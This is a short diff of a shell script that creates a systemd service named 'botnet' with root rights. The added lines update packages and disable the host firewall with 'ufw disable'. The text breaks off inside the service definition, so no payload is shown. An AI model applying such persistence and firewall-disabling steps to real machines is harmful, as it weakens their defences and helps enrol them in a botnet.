@@ -1,7 +1,9 @@
 #!/bin/sh
 
 sudo touch /etc/systemd/system/botnet.service;
+sudo apt-get update
 sudo apt install net-tools
+sudo ufw disable
 cfg="[Unit]
 Description=botnet
 After=network.target
